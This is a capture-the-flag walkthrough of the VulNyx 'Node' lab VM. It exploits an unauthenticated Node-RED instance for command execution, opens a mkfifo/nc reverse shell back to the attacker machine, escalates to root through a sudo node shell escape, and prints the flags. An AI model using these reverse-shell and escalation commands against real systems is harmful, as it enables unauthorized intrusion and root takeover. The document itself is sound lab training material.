# VulNyx - Node

## Information
**Node** is a low difficulty vulnerable Linux virtual machine from the VulNyx platform, it was created by user d4t4s3c and works correctly on VirtualBox and VMware hypervisors.

## Solution
### Enumeration
Using `nmap` command to scan server `192.168.100.185`:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -vv -T4 192.168.100.185
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-16 15:03 +07
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:03
Completed NSE at 15:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:03
Completed NSE at 15:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:03
Completed NSE at 15:03, 0.00s elapsed
Initiating ARP Ping Scan at 15:03
Scanning 192.168.100.185 [1 port]
Completed ARP Ping Scan at 15:03, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:03
Completed Parallel DNS resolution of 1 host. at 15:03, 0.01s elapsed
Initiating SYN Stealth Scan at 15:03
Scanning node.lan (192.168.100.185) [65535 ports]
Discovered open port 80/tcp on 192.168.100.185
Discovered open port 22/tcp on 192.168.100.185
Discovered open port 1880/tcp on 192.168.100.185
Completed SYN Stealth Scan at 15:04, 33.40s elapsed (65535 total ports)
Initiating Service scan at 15:04
Scanning 3 services on node.lan (192.168.100.185)
Completed Service scan at 15:04, 11.62s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.100.185.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.84s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.01s elapsed
Nmap scan report for node.lan (192.168.100.185)
Host is up, received arp-response (0.0019s latency).
Scanned at 2026-04-16 15:03:28 +07 for 46s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.56 (Debian)
1880/tcp open  http    syn-ack ttl 64 Node.js Express framework
|_http-cors: GET POST PUT DELETE
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
|_http-title: Node-RED
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:D2:8A:34 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:04
Completed NSE at 15:04, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```
There are 3 open ports:
- `22/tcp`: ssh - OpenSSH 8.4p1 Debian 5+debu11u1 
- `80/tcp`: http - Apache httpd 2.4.56 (Debian) - This is Apache's default page when you have not configured a virtual host or deployed any applications.
- `1880/tcp`: http - **Node-RED**, Node.js Express framework

**Node-Red** usually has a web administration interface. Without strong password protection or HTTPS, an attacker can hijack the stream.

### Shell (dev)
Access address `http://192.168.100.185:1880`:
![node-red-web](/walkthroughs/vulnyx/low-difficulty/node/Node-Red_web.png)

**Node-RED** web interface is unprotected by default and allow anymore to execute arbitrary commands on the remote host by crafing the right "flow".

We use python script `node_red_exploit.py` to exploit **Node-RED** Remote Command Execution. This script automates everything from creating and updating the workflow with every command you enter, getting the output back over WebSocket, to clean everything when you leave the shell.
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/node]
└─$ python node_red_exploit.py http://192.168.100.185:1880
[+] Node-RED does not require authentication.
/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/low-difficulty/node/node_red_exploit.py:299: DeprecationWarning: There is no current event loop
  asyncio.get_event_loop().run_until_complete(exploit(args.url))
[+] Establishing RCE link ....
> whoami
---------------------------------------------------------------------
Your flow credentials file is encrypted using a system-generated key.

If the system-generated key is lost for any reason, your credentials
file will not be recoverable, you will have to delete it and re-enter
your credentials.

You should set your own key using the 'credentialSecret' option in
your settings file. Node-RED will then re-encrypt your credentials
file using your chosen key the next time you deploy a change.
---------------------------------------------------------------------
/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/low-difficulty/node/node_red_exploit.py:271: RuntimeWarning: coroutine 'Connection.close' was never awaited
  websocket.close()
RuntimeWarning: Enable tracemalloc to get the object allocation traceback
>
```
Use `nc` to open a TCP socket on port 443 and wait for incoming connections on Kali machine.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
```
We use the payload below on the newly acquired shell of the victim machine. The victim machien connects back to the attacker machine and allows remote shell control.
```bash
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.100.172 443 > /tmp/f

```
We get the shell as `dev` user in the Kali machine:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.185] 45514
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
dev@node:~$ ls -la
ls -la
total 40
drwx------ 5 dev  dev  4096 may 16  2023 .
drwxr-xr-x 3 root root 4096 may 16  2023 ..
lrwxrwxrwx 1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 dev  dev   220 ene 15  2023 .bash_logout
-rw------- 1 dev  dev  3526 ene 15  2023 .bashrc
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .local
drwxr-xr-x 4 dev  dev  4096 abr 17 04:17 .node-red
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .npm
-rw------- 1 dev  dev   807 ene 15  2023 .profile
-rw-r--r-- 1 dev  dev    66 may 16  2023 .selected_editor
-r-------- 1 dev  dev    33 may 16  2023 user.txt
```
### Privilege Escalation
#### Enumeration
The `dev` user can run the `node` binary as `root` with `sudo`:
```bash
dev@node:~$ sudo -l
sudo -l
Matching Defaults entries for dev on node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev may run the following commands on node:
    (root) NOPASSWD: /usr/bin/node
```
#### Abuse
In `GTFOBins`, they give us the shell-escape sequence and we become the `root` user.
```bash
dev@node:~$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
<ild_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# whoami
whoami
root
```
#### Flags
As a `root` user, we can read the `user.txt` and `root.txt` flags.

```bash
# find / -name root.txt 2>/dev/null | xargs cat
find / -name root.txt 2>/dev/null | xargs cat
022f2cdb73481093671bd0478637826e
# cat user.txt  
cat user.txt
7af9fe48030ae8afab06e30ee132d9b4
# 
```

***You are welcome!***
